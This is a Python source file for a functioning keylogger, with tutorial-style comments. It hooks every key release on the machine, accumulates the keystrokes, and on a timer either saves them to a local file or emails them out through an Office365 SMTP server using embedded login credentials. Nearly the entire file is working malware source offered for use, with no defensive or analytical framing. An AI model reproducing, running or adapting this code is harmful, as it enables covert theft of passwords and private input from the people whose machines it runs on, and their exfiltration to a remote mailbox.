# listen to keystrokes in the background
# whenever a key is pressed and released, add it to a global string variable
# every X number of minutes, write this string to a local file or send in an email

# look into 'keyloggers' module and 'keyboard' module

import keyboard
import smtplib      # used for emailing the keylogs

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# send the keylog every X number of seconds
SEND_INTERVAL = 120 

# replace these values with your own email login, if you want to email the keylogs
EMAIL_ADDRESS = "Dwight.Schrute@DunderMifflin.com"
EMAIL_PASSWORD = "BearsBeetsBattlestarGalactica"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method

        self.log = ""   # stores the keystrokes

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        # this is called whenever a key is released
        name = event.name

        if len(name) > 1:

            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        self.log += name


    # if you use a log file, the filename is made with start and end timestamps
    # take datetimes, convert to string and make a filename (the name of the logs)
    def update_filename(self):

        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"


    # create a log file in current working directory that has current keylogs in 'self.log' variable
    # makes a new file named 'self.filename' and saves the keylogs in it
    def report_to_file(self):

        # create the file (open in 'write' mode) and write the keylogs to the file
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    # make MIMEMultipart from text, creates HTML and text versions to send as email
    # you're basically sending yourself an email with the keylogs
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS         # send it to yourself
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogs"

        html = f"<p>{message}</p>"          # body of the email
        mime_text = MIMEText(message, "plain")
        mime_html = MIMEText(html, "html")
        msg.attach(mime_text)
        msg.attach(mime_html)

        # after creating the email, return it as a string
        return msg.as_string()


    # manage connnection to SMTP server
    def sendmail(self, email, password, message, verbose=True):

        # this is using Office365. If you use a different email provider, use their SMTP servers.
        # list of SMTP servers: https://domar.com/pages/smtp_pop3_server
        server = smtplib.SMTP(host="smtp.office365.com", port=587)

        server.starttls()        # connect to SMTP server with TLS for security

        server.login(email, password)       # login to your email account

        server.sendmail(email, email, self.prepare_mail(message))   # send the email

        server.quit()             # end the session

        if verbose:                # print to the console
            print(f"[*] - {datetime.now()} - Sent an email to {email} with the following message:\n{message}")


    # this method gets called every 'self.interval'. It sends the keylog and resets 'self.log' variable 
    def report_keylog(self):

        # if a keylog exists, report it
        if self.log:

            self.end_dt = datetime.now()

            self.update_filename()

            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)

            elif self.report_method == "file":
                self.report_to_file()

            print(f"[{self.filename}] - {self.log}")        # OPTIONAL: print the keylog to the console
            self.start_dt = datetime.now()

        # reset the 'log' variable
        self.log = ""

        # recursively calls 'report_keylog()' each 'self.interval' in separate threads
        timer = Timer(interval=self.interval, function=self.report_keylog)      

        # '.daemon' makes the timer thread die when the main thread dies (i.e. this thread won't stop the whole program from quitting.)
        # normally when you quit the program, the main thread waits for other threads to finish before quitting
        timer.daemon = True
        timer.start()       # start the timer again



    def start(self):

        self.start_dt = datetime.now()

        # every time a key is released, it calls the callback method
        keyboard.on_release(callback=self.callback)

        # runs on a separate thread
        self.report_keylog()

        print(f"[*] - {datetime.now()} - Started the keylogger")

        # blocks the current thread until 'CTRL-C' is pressed
        keyboard.wait()


if __name__ == "__main__":

    keylogger = Keylogger(interval=SEND_INTERVAL, report_method="file") # replace this line for email
    keylogger.start()

    # keylogger = Keylogger(interval=SEND_INTERVAL, report_method="email")